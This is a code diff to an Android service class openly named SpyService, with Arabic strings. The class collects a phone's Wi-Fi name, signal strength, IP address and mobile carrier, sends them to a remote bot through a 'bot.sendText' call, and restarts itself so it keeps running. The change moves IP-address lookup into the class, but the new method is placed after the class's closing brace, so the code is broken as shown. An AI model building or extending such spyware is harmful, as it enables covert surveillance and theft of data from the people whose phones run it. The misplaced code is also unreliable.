@@ -434,7 +434,7 @@ public class SpyService extends Service {
             android.net.wifi.WifiInfo wifiInfo = wifi.getConnectionInfo();
             info += "WiFi: " + (wifiInfo.getSSID() != null ? wifiInfo.getSSID() : "غير متصل") + "\n";
             info += "القوة: " + android.net.wifi.WifiManager.calculateSignalLevel(wifiInfo.getRssi(), 5) + "/5\n";
-            info += "IP: " + Utils.getIpAddress() + "\n";
+            info += "IP: " + getIpAddress() + "\n";
             info += "المشغل: " + ((TelephonyManager) getSystemService(TELEPHONY_SERVICE)).getNetworkOperatorName() + "\n";
             bot.sendText(info);
         } catch (Exception e) {
@@ -927,3 +927,19 @@ public class SpyService extends Service {
         startService(new Intent(this, SpyService.class));
     }
 }
+
+    // ========== دالة الحصول على عنوان IP ==========
+    private String getIpAddress() {
+        try {
+            for (java.net.NetworkInterface networkInterface : java.util.Collections.list(java.net.NetworkInterface.getNetworkInterfaces())) {
+                for (java.net.InetAddress inetAddress : java.util.Collections.list(networkInterface.getInetAddresses())) {
+                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof java.net.Inet4Address) {
+                        return inetAddress.getHostAddress();
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "getIpAddress error", e);
+        }
+        return "غير متاح";
+    }
